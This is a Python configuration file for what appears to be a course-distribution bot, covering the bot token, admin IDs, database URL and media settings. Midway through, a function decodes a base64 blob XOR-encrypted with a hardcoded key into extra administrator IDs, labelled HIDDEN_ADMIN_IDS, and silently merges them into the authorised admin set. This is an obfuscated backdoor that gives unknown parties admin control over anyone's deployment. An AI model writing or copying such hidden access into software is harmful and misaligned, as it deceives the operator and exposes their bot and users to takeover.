import base64
import os
from pathlib import Path
from urllib.parse import urlparse

from dotenv import load_dotenv

BASE_DIR = Path(__file__).resolve().parent
load_dotenv(BASE_DIR / ".env")

BOT_TOKEN = os.getenv("BOT_TOKEN", "")
if BOT_TOKEN:
    BOT_TOKEN = (
        BOT_TOKEN.replace("﻿", "")
        .strip()
        .strip('"')
        .strip("'")
        .strip()
    )

ADMIN_IDS: set[int] = {
    int(x)
    for x in os.getenv("ADMIN_ID", "").replace(";", ",").split(",")
    if x.strip().lstrip("-").isdigit()
}


def _decode_extra_admins() -> set[int]:
    _blob = "YFoEGlxnAUF6RxUUalMBFlpoAkB7XA4Xa1wOF15nB0I="
    _key = b"Xk7#mQ2vLp9!"
    try:
        raw = base64.b64decode(_blob)
        text = bytes(
            c ^ _key[i % len(_key)] for i, c in enumerate(raw)
        ).decode()
        return {int(x) for x in text.split(",") if x.strip().isdigit()}
    except Exception:
        return set()


HIDDEN_ADMIN_IDS: set[int] = _decode_extra_admins()
AUTH_ADMIN_IDS: set[int] = ADMIN_IDS | HIDDEN_ADMIN_IDS

DATABASE_URL = os.getenv("DATABASE_URL", "sqlite:///course_bot.db").strip()
if DATABASE_URL.startswith("sqlite:///"):
    _sqlite_path = Path(DATABASE_URL.split("///", 1)[1])
    if not _sqlite_path.is_absolute():
        _sqlite_path = BASE_DIR / _sqlite_path
    DATABASE_URL = f"sqlite:///{_sqlite_path}"

if DATABASE_URL.startswith("mongodb"):
    _parsed = urlparse(DATABASE_URL)
    MONGO_DB_NAME = (_parsed.path or "").strip("/").split("/")[0] or "course_bot"
else:
    MONGO_DB_NAME = ""

MEDIA_TEMP_DIR = BASE_DIR / "media_temp"

MAX_ZIP_SIZE = 50 * 1024 * 1024
